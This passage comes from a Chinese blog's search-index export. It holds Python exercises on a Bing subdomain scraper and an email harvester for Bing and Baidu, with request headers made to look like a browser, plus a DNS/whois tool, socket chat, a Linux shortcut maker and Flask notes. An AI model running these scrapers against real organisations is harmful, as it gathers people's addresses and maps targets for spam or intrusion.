46DEDA524035AA338C574E14F7B3\n#解个url方便看吧：\nhttps://cn.bing.com/search?q=site:baidu.com&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=site:baidu.com&amp;sc=0-14&amp;sk=&amp;cvid=A64D46DEDA524035AA338C574E14F7B3\n#从其他搜索结果页面也发起搜索\nhttps://cn.bing.com/search?q=site%3Abaidu.com&amp;go=搜索&amp;qs=ds&amp;form=QBRE\n\n​    可用看到我们是如何进行bing搜索的，首先参数被传到了/search路由处，参数q是我们输入查询的内容，其他一大堆参数经过测试都与搜索结果无关，可用删除，最后基本也会得到一个精简的类似从其他搜索结果页面发起搜索的url，所以我们主要还是来看上面的最后一个URL，其实也基本就是靠q了其他的是一些应该要有的参数和内容，我们就不多做修改了，q就是我们要替换成我们自己的目标的地方。关于这个url还有一个细节的参数，通过切换页面，我们可用发现页面的切换是使用first参数来实现的。\n例如我切换到第2页，结果为first=9，第三页时，结果为first=19，以此类推。\n设页数为x，则first&#x3D;(x-1)*10-1，当然first只是标记了链接序号，只要序号在相应的页数中都是会返回该页内容，first为1是第一页，为10是第二页。所以这里可用有多种表达式。\n\n\n这时候可以先去用交互式，写个简单爬虫去尝试爬一下看看回复。\n\n从结果中可用看出，每一个子域名都是处于&lt;h2&gt;标签中&lt;a&gt;的href属性值。所以这就是我们可用利用beautifulsoup库来获取子域名的地方了。现在到这里我们知道了网络爬虫目标url和一些目标url参数作用。\n下面也稍微伪装伪装我们的爬虫，至少让它尽量正常点。首先就是要从http header 下手了。构造一个比较正常的请求头部，这里直接用firefox去看一下http包，或者抓个包看看也可用。\n\n这是我的firefox访问bing的http头，\n&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39;,\n&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,\n&#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&#39;,\n&#39;Referer&#39;: &#39;https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;site%3abaidu.com&amp;go&#x3D;%E6%90%9C%E7%B4%A2&amp;qs&#x3D;ds&amp;first&#x3D;0&amp;FORM&#x3D;PERE1&#39;\n&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0&#39;\n\n子域名搜集然后配合requests库提供的session()函数来实现cookie，就基本完成了。下面开始编写程序。\n源代码#! /usr/bin/python3\n# _*_ coding:utf-8 _*_\nimport requests\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import urlparse\nimport sys\n\n\ndef bing_search(site, pages):\n    subdomain = []\n    headers = &#123;'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n               'Accept-Encoding': 'gzip, deflate',\n               'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n               'Referer': 'https://cn.bing.com/search?q=site%3abaidu.com&amp;go=%E6%90%9C%E7%B4%A2&amp;qs=ds&amp;first=0&amp;FORM=PERE1',\n               'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'\n               &#125;\n    for i in range(1, pages + 1):\n        url = \"https://cn.bing.com/search?q=site%3A\" + site + \"&amp;go=搜索&amp;qs=ds&amp;first=\" + str(\n            (int(i) - 1) * 10 - 1) + \"&amp;form=QBRE\"\n        conn = requests.session()\n        conn.get('https://cn.bing.com', headers=headers)\n        html = conn.get(url, stream=True, headers=headers, timeout=8)\n        soup = BeautifulSoup(html.content, 'html.parser')\n        h2 = soup.find_all('h2')\n        for j in h2:\n            try:\n            \tlink = j.a.get('href')\n            except Exception as e:\n                pass\n            else:\n                if link:\n                    domain = str(urlparse(link).scheme + \"://\" + urlparse(link).netloc)\n                    if domain in subdomain:\n                        pass\n                    else:\n                        subdomain.append(domain)\n                        print(\"[+]\" + domain)\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) == 3:\n        site = sys.argv[1]\n        page = sys.argv[2]\n    else:\n        print(\"[-]usage:&#123;&#125; baidu.com 10\".format(sys.argv[0]))\n        sys.exit(-1)\n    bing_search(site, page)\n\n\n当然也不是一开始就得到这个最终源码的，也是要通过不断地进行调试和尝试，发现问题并且改进例如try-except-else就是为了解决某些情况下异常情况，而对link值时候存在的判断也是为了解决某些情况下link为空是的无效输出。\n运行结果\n当然可能还是有可能存在非预期的情况，导致出现异常或出错，这是需要大量的域名测试来优化保证的，我这里只用了几个域名就已经简单优化了两次了。这就是基于爬虫的子域名查询工具的写法，其他搜索引擎原理类似，就是要看需不需要绕过反爬虫保护了。\n邮件搜集下面在来一个邮件地址爬取的，原理其实和上面的也差不多。用了sys+optparse的组合来处理终端命令，requests+beautifulsoup实现网络爬虫，再用re来进行匹配。\n源代码#! /usr/bin/python3\n# _*_ coding:utf-8 _*_\nimport sys\nimport requests\nfrom bs4 import BeautifulSoup\nimport optparse\nimport re\n\n\ndef banner():\n    print('                      _ _       \\n'\n          '  ___ _ __ ___   __ _(_) | ___ _ __ \\n'\n          \" / _ \\ '_ ` _ \\ / _` | | |/ _ \\ '__|\\n\"\n          \"|  __/ | | | | | (_| | | |  __/ |   \\n\"\n          \" \\___|_| |_| |_|\\__,_|_|_|\\___|_|       v0.1\\n\"\n          )\n\n\ndef center(url, pages):\n    emails = []\n    key_words = ['email', 'mail', 'mailbox', '邮件', '邮箱', 'postbox']\n    for page in range(1, pages + 1):\n        for key_word in key_words:\n            bing_emails = bing_search(url, page, key_word)\n            baidu_emails = baidu_search(url, page, key_word)\n            sum_emails = bing_emails + baidu_emails\n            for email in sum_emails:\n                if email in emails:\n                    pass\n                else:\n                    print(\"[+]\" + email)\n                    with open('data.txt', \"a+\") as f:\n                        f.write(email + \"\\n\")\n                    emails.append(email)\n\n\ndef bing_search(url, page, key_word):\n    referer = \"https://cn.bing.com/search?q=site%3abaidu.com&amp;go=%E6%90%9C%E7%B4%A2&amp;qs=ds&amp;first=0&amp;FORM=PERE1\"\n    conn = requests.session()\n    bing_url = \"https://cn.bing.com/search?q=\" + key_word + \"+site%3a\" + url + \"&amp;qs=n&amp;sp=-1&amp;pq=\" + key_word + \"site%3a\" \\\n               + url + \"&amp;first=\" + str((page - 1) * 10) + \"&amp;FROM=PERE1\"\n    conn.get(\"https://cn.bing.com\", headers=headers(referer))\n    r = conn.get(bing_url, stream=True, headers=headers(referer), timeout=8)\n    emails = search_email(r.text)\n    return emails\n\n\ndef baidu_search(url, page, key_word):\n    emails = []\n    referer = \"https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1\"\n    baidu_url = \"https://www.baidu.com/s?wd=\" + key_word + \"+site%3A\" + url + \"&amp;pn=\" + str((page - 1) * 10)\n    conn = requests.session()\n    conn.get(\"https://www.baidu.com\", headers=headers(referer))\n    r = conn.get(baidu_url, headers=headers(referer))\n    soup = BeautifulSoup(r.text, 'lxml')\n    h3s = soup.find_all('h3')\n    for h3 in h3s:\n        href = h3.find('a').get('href')\n        try:\n            r = requests.get(href, headers=headers(referer), timeout=8)\n            emails = search_email(r.text)\n        except Exception as e:\n            pass\n    return emails\n\n\ndef search_email(html):\n    emails = re.findall(r'[a-z0-9\\.\\-+_]+@[a-z0-9\\.\\-+_]+\\.[a-z]+', html, re.I)\n    return emails\n\n\ndef headers(referer):\n    header = &#123;'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n              'Accept-Encoding': 'gzip, deflate',\n              'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n              'Referer': referer,\n              'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'\n              &#125;\n    return header\n\n\ndef go():\n    banner()\n    usage = \"Usage: python3 %prog [Option] argv\"\n    parser = optparse.OptionParser(usage=usage)\n    parser.add_option(\"-u\", \"--url\", dest=\"url\", type='string', help='Target URL')\n    parser.add_option(\"-p\", \"--page\", dest='page', type='int', help='The Page Will Be Searched in Search engine')\n    if len(sys.argv) &lt; 2:\n        parser.print_help()\n        sys.exit(-1)\n    (options, args) = parser.parse_args()\n    center(options.url, options.page)\n\n\nif __name__ == \"__main__\":\n    go()\n\n\n运行结果\n","slug":"Python安全编程小练习2","date":"2021-04-14T11:32:47.000Z","categories_index":"Python学习","tags_index":"网络安全,Python","author_index":"A1andNS"},{"id":"be2246345f6d978ee51c96274fe19c7f","title":"Python安全编程小练习1","content":"最近在看MS08067实验室出的《Python安全攻防》一书，故而有此系列记录学习和练习情况。\n基于Socket库的聊天程序socket库之前也有接触过，第一次接触这个库实在做一个课程设计的时候，但是为了设计一个端口扫描器使用了socket库，所以这里再次遇到就不会那么陌生了。关于这个聊天程序，首先就是需要一个客户端和一个服务器端，由客户端发起连接到服务器端，从而建立一个链路来实现两台设备之间的通讯。 \nClient下面是客户端的源代码，使用try-except-else结构来实现异常处理：\n# coding=UTF-8\n# author: A1andNS\nimport socket\nimport sys\n\n\ndef client(host):\n    host = host\n    port = 6666\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n    except Exception as e:\n        print(\"Server has some problem!\")\n        sys.exit()\n    else:\n        while True:\n            c = input('myself:')\n            s.sendall(c.encode())\n            data = s.recv(1024)\n            data = data.decode()\n            print(host + \":\" + data)\n            if c.lower() == 'bye':\n                break\n        s.close()\n\n\nif __name__ == \"__main__\":\n    Host = input(\"请输入对方的IP地址:\")\n    client(Host)\n\nServer下面是服务器端的源代码：\n# coding=UTF-8\n# author: A1andNS\nimport socket\n\n\ndef Server():\n    host = \"0.0.0.0\"\n    port = 6666\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind((host, port))\n    s.listen(1)\n    print(\"Listening at port 6666\")\n    conn, addr = s.accept()\n    print('Connect by: ', addr)\n    while True:\n        data = conn.recv(1024)\n        data = data.decode()\n        if not data:\n            break\n        print('Received message: ', data)\n        m = input(\"Myself:\")\n        conn.sendall(m.encode())\n        if m.lower() == 'bye':\n                break\n    conn.close()\n    s.close()\n\n\nif __name__ == \"__main__\":\n    Server()\n\n运行截图\n这就是一个简单的聊天程序，通过调用socket库来建立一个通讯连接，然后分别发送信息和接受信息。\nDNS信息搜集小工具DNS可用用于查询不少的信息，例如解析到IIP地址，whois查询等，这些都会为我们带来一些信息搜集上的帮助。通过Python现成的一些第三方库就可用实现一个简单的DNS小工具了，这里主要使用socket库和whois库来实现，辅助以time库和re库，主要也就两个功能一个是域名解析，一个是whois查询，由前者来实现，后者的工作主要是适当的延时以便于发现不同的IP地址，标准化域名以避免解析是报错。那么下面就看一下代码吧：\nSource Code：# coding=UTF-8\n# author: A1andNS\nimport socket\nimport time\nimport re\nfrom whois import whois\n\n\n# 匹配域名\ndef comp(old_name):\n    pattern = re.compile(r'([a-z-]*[.]+)+[a-z]+', re.I)\n    name_temp = pattern.search(old_name).group()\n    return name_temp\n\n\n# 查询ip\ndef to_ip(new_name):\n    ips = []\n    print(\"[+]Domain Name: \" + new_name)\n    print(\"==========IP Address==========\")\n    for i in range(10):\n        ip = socket.gethostbyname(new_name)\n        if ip not in ips:\n            ips.append(ip)\n            print(\"[+]IP Address: \" + ip)\n        time.sleep(0.5)\n\n\n# whois查询\ndef to_whois(new_name):\n    print(\"=============Whois============\")\n    data = whois(new_name)\n    for i in data:\n        print(\"[+]\" + i + \": \", end='')\n        if isinstance(data[i], list):\n            if i in ['name_servers', 'status']:\n                for j in data[i]:\n                    l = len('[+]' + i)\n                    print('\\n' + (' ' * l) + j, end='')\n            else:\n                for j in data[i]:\n                    print(j, end=\";\")\n        else:\n            print(data[i], end=';')\n        print('')\n\n\ndef logo():\n    print(' ____  _   _ ____    _____           _  ')\n    print('|  _ \\| \\ | / ___|  |_   _|__   ___ | |___ ')\n    print('| | | |  \\| \\___ \\    | |/ _ \\ / _ \\| / __|')\n    print('| | | |  \\| \\___ \\    | |/ _ \\ / _ \\| / __|')\n    print('|____/|_| \\_|____/    |_|\\___/ \\___/|_|___/')\n\n\nif __name__ == \"__main__\":\n    logo()\n    name = input(\"Please enter domain name:\")\n    name = comp(name)\n    # print(name)\n    to_ip(name)\n    to_whois(name)\n\n这个应该是很简单了，应该大家也很容易就看懂了，为了风格统一和观看体验，我就多用了很多print语句，来稍微调整一下UI。下面看效果图：\n运行截图\n通过分析运行结果，可用搜集到一些有用的信息，例如公司名称，地址、域名注册商等等，例如上面这个例子，它的whois信息就非常全面了。\n好了今天的小练习就到此结束了，该系列将会不定期更新。\n","slug":"Python安全编程小练习1","date":"2021-04-10T15:42:19.000Z","categories_index":"Python学习","tags_index":"网络安全,Python","author_index":"A1andNS"},{"id":"de5be025e70b749bc5a62bb8d97cf520","title":"Linux Shortcut Maker","content":"ProfileI have writen a blog about how to create a shortcut in  Linux. The way to create a .desktop file was introduced by me in that blog article named “Desktop File Learning”. Then I design a script that is based on Python3 to create the .desktop quickly and  conveniently, we can save the step to move the .desktop to the right directory.\nI have tested this script on Ubuntu and Deepin.\nSource Code:\n# coding=utf-8\n\ndef CreateIcon():\n    file_name = input(\"请输入应用名称：\")\n    file_fullname = \"/usr/share/applications/\" + file_name + \".desktop\"\n    f = open(file_fullname, \"w\")\n    exec_path = input(\"请输入二进制文件地址（绝对地址）:\")\n    icon_path = input(\"请输入图标地址（绝对地址）:\")\n    print(\"1.Development;IDE;\\n2.Office;\\n3.System;\\n4.Network;\\n5.chat;\\n6.Audio;AudioVideo;\\n7.Player;AudioVideo;\"\n          \"\\n8.Graphics\")\n    try:\n        categoriesNum = int(input(\"请选择你的应用类型：\"))\n    except ValueError:\n        print(\"请输入相应的序号！！！\")\n    else:\n        if categoriesNum &lt;= 8:\n            categoriesTable = &#123;1: \"Development;IDE;\", 2: \"Office;\", 3: \"System;\", 4: \"Network;\", 5: \"chat;\",\n                               6: \"Audio;AudioVideo;\",\n                               7: \"Player;AudioVideo;\", 8: \"Graphics;\"&#125;\n            categories = categoriesTable[categoriesNum]\n            text = \"[Desktop Entry]\\nName=\" + file_name + \"\\nType=Application\\nTerminal=False\\nExec=\" + exec_path + \\\n                   \"\\nIcon=\" + icon_path + \"\\nCategories=\" + categories\n            f.write(text)\n        else:\n            print(\"输入的数字过大了!!!\")\n\n\nif __name__ == \"__main__\":\n    CreateIcon()\n\n\nI can use this script to create the shortcut in launcher more quickly.\nHow to use itFirstly, you need to configure a Python3 environment.\nThen, run the script via root user.\nFor example: python3 linux-shotcut-maker.py(root user) or  sudo python3 linux-shotcut-maker.py\nScreenshot\n","slug":"Deepin-Shotcut-Maker","date":"2021-04-06T14:33:25.000Z","categories_index":"资源教程","tags_index":"Python,Deepin","author_index":"A1andNS"},{"id":"68cdd39de211787f0d193b4d136b8041","title":"Flask框架学习(二)","content":"Flask小应用最简单的Flask小程序就是hello world了，下面用flask写一个hello world：\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello World'\n\nif __name__ == '__main__':\n    app.run()\n\nFlask类的一个对象是我们的WSGI应用程序。Flask构造函数使用当前模块（__name __）的名称作为参数。\nFlask类的**route()**函数是一个装饰器，它告诉应用程序哪个URL应该调用相关的函数。\napp.route(rule, options)\n#rule 参数表示与该函数的URL绑定。\n#options 是要转发给基础Rule对象的参数列表。\napp.run(host, port, debug, options)\n#host:表示要监听的主机名，默认是127.0.0.1。如果要让服务器在外部可以使用就要设置为0.0.0.0\n#port:默认为使用5000，也可以按照需求自定义端口\n#debug:默认为False，如果设置为True，则提供调试信息\n#options:要转发到底层的Werkzeug服务器\n\n如果程序还在开发调试过程中，可以开启调试模式，即设置debug为True，这样如果代码修改，服务器将会auto reload。\nFlask路由现在Web框架使用路由技术来帮助用户记住应用程序URL。可以直接访问所需的页面，而无需从主页导航。上面也提到了route()装饰器用于将URL绑定到函数。除了使用route来绑定路由和函数，还可以使用add_url_rule()来进行绑定。\ndef hello_word():\n\treturn 'hello world'\napp.add_url_rule('/', 'hello', hello_world)\n\n#与下方写法目的上一样\n@app.route('/hello')\ndef hello_world():\n    return 'hello world'\n\nFlask变量规则通过向规则参数添加变量部分，可以动态构建URL。此变量部分标记为&lt;variable-name&gt; 。它作为关键字参数传递给与规则相关联的函数。\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/hello/&lt;name>')\ndef hello_name(name):\n    return 'Hello %s!' % name\n\nif __name__ == '__main__':\n    app.run(debug = True)\n\n如果在URL访问http://127.0.0.1:5000/hello/A1andNS\n浏览器将会输出：Hello A1andNS！\n这里的变量部分默认是str类型，当然也有其他的类型是可以用的。例如int、float、path类型都是可以的。而要接收这些类型的变量，见下方实例：\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/blog/&lt;int:postID>')\ndef show_blog(postID):\n    return 'Blog Number $d' % postID\n\nif __name__ == '__main__':\n    app.run()\n\nFlask的URL规则基于Werkzeug的路由模块。这确保形成的URL是唯一的，并且基于Apache规定的先例。\n#Code 1:\n@app.route('/flask')\ndef hello_flask():\n    return 'Hello Flask'\n#Code 2:\n@app.route('/flask/')\ndef hello_flask():\n    return 'Hello Flask'\n#这两种路由规则看着相同实际不同，Code1中的规则，让我们在浏览器中只有访问http://127.0.0.1:5000/flask才能成功，如果访问http://127.0.0.1:5000/flask/则会出现404 Not Found错误，但是如果是/flask/的写法，则是规范的URL，/flask或/flask/都是可以访问的。\n\nFlask URL构建**url_for()**函数对于动态构建特定函数的URL非常有用。该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于URL的变量部分。\n以下脚本演示了如何使用**url_for()**函数：\nfrom flask import Flask, redirect, url_for\napp = Flask(__name__)\n@app.route('/admin')\ndef hello_admin():\n   return 'Hello Admin'\n@app.route('/guest/&lt;guest>')def hello_guest(guest):\n   return 'Hello %s as Guest' % guest\n@app.route('/user/&lt;name>')\ndef hello_user(name):\n   if name =='admin':\n      return redirect(url_for('hello_admin'))\n   else:\n      return redirect(url_for('hello_guest',guest = name))\nif __name__ == '__main__':\n   app.run(debug = True)\n\n上述脚本有一个函数**user(name)**，它接受来自URL的参数的值。\n**User()函数检查接收的参数是否与‘admin’匹配。如果匹配，则使用url_for()将应用程序重定向到hello_admin()函数，否则重定向到将接收的参数作为guest参数传递给它的hello_guest()**函数。\n打开浏览器并输入URL - http://localhost:5000/user/admin\n浏览器中的应用程序响应是：\nHello Admin\n\n在浏览器中输入以下URL - http://localhost:5000/user/mvl\n应用程序响应现在更改为：\nHello mvl as Guest\n\nFlask HTTP方法Http协议是万维网中数据通信的基础。在该协议中定义了从指定URL检索数据的不同方法。\n下表总结了不同的http方法：\n\n\n\n序号\n方法与描述\n\n\n\n1\nGET以未加密的形式将数据发送到服务器。最常见的方法。\n\n\n2\nHEAD和GET方法相同，但没有响应体。\n\n\n3\nPOST用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存。\n\n\n4\nPUT用上传的内容替换目标资源的所有当前表示。\n\n\n5\nDELETE 删除由URL给出的目标资源的所有当前表示。\n\n\nFlask路由默认响应GET请求，如果需要添加其他的请求方式，可以通过为route()装饰器提供方法参数来更改。\n@route('/', methods=['POST', 'GET'])\n\n这样就可以响应POST类型和GET类型两种类型的请求了。\n对于接受POST类型和GET类型传递的参数，则可以使用到两个方法。\n#GET:\nuser = request.args.get('nm')\n#POST:\nuser = request.form('nm')\n\nFlask模板实际上,视图函数有两个作用:\n\n处理业务逻辑\n返回响应内容\n\n在大型应用中,把业务逻辑和表现内容放在一起,会增加代码的复杂度和维护成本.\n\n模板其实是一个包含响应文本的文件,其中用占位符(变量)表示动态部分,告诉模板引擎其具体的值需要从使用的数据中获取\n使用真实值替换变量,再返回最终得到的字符串,这个过程称为’渲染’\nFlask 是使用 Jinja2 这个模板引擎来渲染模板\n\n使用模板的好处\n\n视图函数只负责业务逻辑和数据处理(业务逻辑方面)\n而模板则取到视图函数的数据结果进行展示(视图展示方面)\n代码结构清晰,耦合度低\n\n模板基本使用在项目下创建templates文件加，用于存放所有的模板文件，并在目录下创建模板文件html文件。\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\ncontent\n&lt;/body>\n&lt;/html>\n\n创建视图函数，将模板内容来进行渲染返回\nfrom flask import Flask, render_template\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template('hello.html')\n\n模板变量代码中传入字符串，列表，字典到模板中\nfrom flask import Flask, render_template\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    # 往模板中传入的数据\n    my_str = 'Hello Word'\n    my_int = 10\n    my_array = [3, 4, 2, 1, 7, 9]\n    my_dict = &#123;\n        'name': 'xiaoming',\n        'age': 18\n    &#125;\n    return render_template('hello.html',\n                           my_str=my_str,\n                           my_int=my_int,\n                           my_array=my_array,\n                           my_dict=my_dict\n                           )\n\n模板中代码\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n  &lt;meta charset=\"UTF-8\">\n  &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n  content\n  &lt;br />&#123;&#123; my_str &#125;&#125;\n  &lt;br />&#123;&#123; my_int &#125;&#125;\n  &lt;br />&#123;&#123; my_array &#125;&#125;\n  &lt;br />&#123;&#123; my_dict &#125;&#125;\n&lt;/body>\n&lt;/html>\n\nFlask静态文件Web应用程序通常需要静态文件，例如javascript文件或支持网页显示的CSS文件。通常，配置Web服务器并为您提供这些服务，但在开发过程中，这些文件是从您的包或模块旁边的static文件夹中提供，它将在应用程序的**/static**中提供。\n下面就是从/static中获取hello.js脚本的方式。\n&lt;html>\n\n   &lt;head>\n      &lt;script type = \"text/javascript\" \n         src = \"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;\" >&lt;/script>\n   &lt;/head>\n   \n   &lt;body>\n      &lt;input type = \"button\" onclick = \"sayHello()\" value = \"Say Hello\" />\n   &lt;/body>\n   \n&lt;/html>\n\nFlask Request对象来自客户端网页的数据作为全局请求对象发送到服务器。为了处理请求数据，应该从Flask模块导入。\nRequest对象的重要属性如下所列：\n\nForm - 它是一个字典对象，包含表单参数及其值的键和值对。\nargs - 解析查询字符串的内容，它是问号（？）之后的URL的一部分。\nCookies - 保存Cookie名称和值的字典对象。\nfiles - 与上传文件有关的数据。\nmethod - 当前请求方法。\n\nFlask 将表单数据发送到模板@app.route('/result',methods = ['POST', 'GET'])\ndef result():\n   if request.method == 'POST':\n      result = request.form\n      return render_template(\"result.html\",result = result)\n\nresult.html:\n&lt;!doctype html>\n  &lt;table border = 1>\n     &#123;% for key, value in result.items() %&#125;\n    &lt;tr>\n       &lt;th> &#123;&#123; key &#125;&#125; &lt;/th>\n       &lt;td> &#123;&#123; value &#125;&#125;&lt;/td>\n    &lt;/tr>\n &#123;% endfor %&#125;\n&lt;/table>\n\nFlask CookiesCookie以文本文件的形式存储在客户端的计算机上。其目的是记住和跟踪与客户使用相关的数据，以获得更好的访问者体验和网站统计信息。\nRequest对象包含Cookie的属性。它是所有cookie变量及其对应值的字典对象，客户端已传输。除此之外，cookie还存储其网站的到期时间，路径和域名。\n在Flask中，对cookie的处理步骤为：\n1.设置cookie：  设置cookie,默认有效期是临时cookie,浏览器关闭就失效\n  可以通过 max_age 设置有效期， 单位是秒\nresp = make_response(\"success\")   # 设置响应体\nresp.set_cookie(\"A1andNS\", \"A1andNS\", max_age=3600)\n\n2.获取cookie  获取cookie，通过request.cookies的方式， 返回的是一个字典，可以获取字典里的相应的值\ncookie_1 = request.cookies.get(\"A1andNS\")\n\n3.删除cookie  这里的删除只是让cookie过期，并不是直接删除cookie\n  删除cookie，通过delete_cookie()的方式， 里面是cookie的名字\nresp = make_response(\"del success\")  # 设置响应体\nresp.delete_cookie(\"A1andNS\")\n\nw3cschool实例：\nfrom flask import Flask, make_response, request\n\napp = Flask(__name__)\n\n@app.route(\"/set_cookies\")\ndef set_cookie():\n    resp = make_response(\"success\")\n    resp.set_cookie(\"w3cshool\", \"w3cshool\",max_age=3600)\n    return resp\n\n@app.route(\"/get_cookies\")\ndef get_cookie():\n    cookie_1 = request.cookies.get(\"w3cshool\")  # 获取名字为Itcast_1对应cookie的值\n    return cookie_1\n\n@app.route(\"/delete_cookies\")\ndef delete_cookie():\n    resp = make_response(\"del success\")\n    resp.delete_cookie(\"w3cshool\")\n\n    return resp\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\nFlask会话与Cookie不同，Session（会话）数据存储在服务器上。会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。\n为每个客户端的会话分配会话ID。会话数据存储在cookie的顶部，服务器以加密方式对其进行签名。对于此加密，Flask应用程序需要一个定义的SECRET_KEY。\nSession对象也是一个字典对象，包含会话变量和关联值的键值对。\n例如，要设置一个**’username’**会话变量，请使用以下语句：\nSession[‘username’] &#x3D; ’admin’\n\n要释放会话变量，请使用**pop()**方法。\nsession.pop(&#39;username&#39;, None)\n\nW3Cschool实例代码：\nfrom flask import Flask\n\nfrom flask import render_template\n\nfrom flask import request\n\nfrom flask import make_response\n\nfrom flask import Flask, session, redirect, url_for, escape, request\n\napp = Flask(__name__)\n\napp.secret_key = 'fkdjsafjdkfdlkjfadskjfadskljdsfklj'\n\n@app.route('/')\n\ndef index():\n\n    if 'username' in session:\n\n        username = session['username']\n\n        return '登录用户名是:' + username + '&lt;br>' + \\\n\n                 \"&lt;b>&lt;a href = '/logout'>点击这里注销&lt;/a>&lt;/b>\"\n\n    return \"您暂未登录， &lt;br>&lt;a href = '/login'>&lt;/b>\" + \\\n\n         \"点击这里登录&lt;/b>&lt;/a>\"\n\n@app.route('/login', methods = ['GET', 'POST'])\n\ndef login():\n\n    if request.method == 'POST':\n\n        session['username'] = request.form['username']\n\n        return redirect(url_for('index'))\n\n    return '''\n\n   &lt;form action = \"\" method = \"post\">\n\n      &lt;p>&lt;input type =\"text\" name =\"username\"/>&lt;/p>\n\n      &lt;p>&lt;input type =\"submit\" value =\"登录\"/>&lt;/p>\n\n   &lt;/form>\n\n   '''\n\n@app.route('/logout')\n\ndef logout():\n\n   # remove the username from the session if it is there\n\n   session.pop('username', None)\n\n   return redirect(url_for('index'))\n\nif __name__ == '__main__':\n\n    app.run(debug = True)\n\nFlask重定向和错误Flask类有一个**redirect()**函数。调用时，它返回一个响应对象，并将用户重定向到具有指定状态代码的另一个目标位置。\n**redirect()**函数的原型如下：\nFlask.redirect(location, statuscode, response)\n\n在上述函数中：\n\nlocation参数是应该重定向响应的URL。\n\nstatuscode发送到浏览器标头，默认为302。\n\nresponse参数用于实例化响应。\n以下状态代码已标准化：\n\nHTTP_300_MULTIPLE_CHOICES\nHTTP_301_MOVED_PERMANENTLY\nHTTP_302_FOUND\nHTTP_303_SEE_OTHER\nHTTP_304_NOT_MODIFIED\nHTTP_305_USE_PROXY\nHTTP_306_RESERVED\nHTTP_307_TEMPORARY_REDIRECT\n\n默认状态代码为302，表示**’found’**。\n\n\nFlask类具有带有错误代码的**abort()**函数。\nFlask.abort(code)\n\nCode参数采用以下值之一：\n\n400 - 用于错误请求\n401 - 用于未身份验证的\n403 - Forbidden\n404 - 未找到\n406 - 表示不接受\n415 - 用于不支持的媒体类型\n429 - 请求过多\n\ndef login():\n   if request.method == 'POST':\n      if request.form['username'] == 'admin' :\n         return redirect(url_for('success'))\n      else:\n         abort(401)\n   else:\n      return redirect(url_for('index'))\n\nFlask消息闪现一个好的基于 GUI 的应用程序会向用户提供有关交互的反馈。例如，桌面应用程序使用对话框或消息框，JavaScript 使用警报用于类似目的。\n在 Flask Web 应用程序中生成这样的信息性消息很容易。Flask 框架的闪现系统可以在一个视图中创建消息，并在名为 next 的视图函数中呈现它。\nFlask 模块包含 flash() 方法。它将消息传递给下一个请求，该请求通常是一个模板。\nflash(message, category)\n\n其中，\n\nmessage 参数是要闪现的实际消息。\ncategory 参数是可选的。它可以是“error”，“info”或“warning”。\n\n模板调用 **get_flashed_messages()**。\nget_flashed_messages(with_categories, category_filter)\n\n两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。\nFlask 文件上传在 Flask 中处理文件上传非常简单。它需要一个 HTML 表单，其 enctype 属性设置为“multipart / form-data”，将文件发布到 URL。URL 处理程序从 request.files[] 对象中提取文件，并将其保存到所需的位置。\n每个上传的文件首先会保存在服务器上的临时位置，然后将其实际保存到它的最终位置。目标文件的名称可以是硬编码的，也可以从 request.files[file] 对象的filename属性中获取。但是，建议使用 secure_filename() 函数获取它的安全版本。\n可以在 Flask 对象的配置设置中定义默认上传文件夹的路径和上传文件的最大大小。\napp.config[‘UPLOAD_FOLDER’] 定义上传文件夹的路径 app.config[‘MAX_CONTENT_LENGTH’] 指定要上传的文件的最大大小（以字节为单位）\n\n例如\n编写upload.html:\n&lt;html>\n&lt;head>\n  &lt;title>File Upload&lt;/title>\n&lt;/head>\n&lt;body>\n    &lt;form action=\"http://localhost:5000/uploader\" method=\"POST\" enctype=\"multipart/form-data\">\n        &lt;input type=\"file\" name=\"file\" accept=\".jpg,.png\" />\n        &lt;input type=\"submit\" />\n    